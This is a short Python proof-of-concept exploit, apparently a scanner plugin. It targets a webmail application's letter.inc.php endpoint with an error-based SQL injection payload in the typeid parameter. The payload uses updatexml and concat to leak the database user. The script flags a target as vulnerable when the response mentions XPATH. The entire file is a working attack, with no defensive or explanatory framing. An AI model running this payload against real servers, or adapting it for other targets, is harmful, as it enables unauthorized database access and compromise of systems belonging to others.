# coding:utf-8
import requests
import re

class Exploit(object):

    def attack(self, url):
        target = url + "/webmail/main/letter.inc.php?cmd=getpagelist&typeid=1' and 1=updatexml(1,concat(0x24,(select user())),1)%23"
        r1 = requests.get(target)
        if r1.status_code == 200 and re.search(r'XPATH', r1.content):
            return target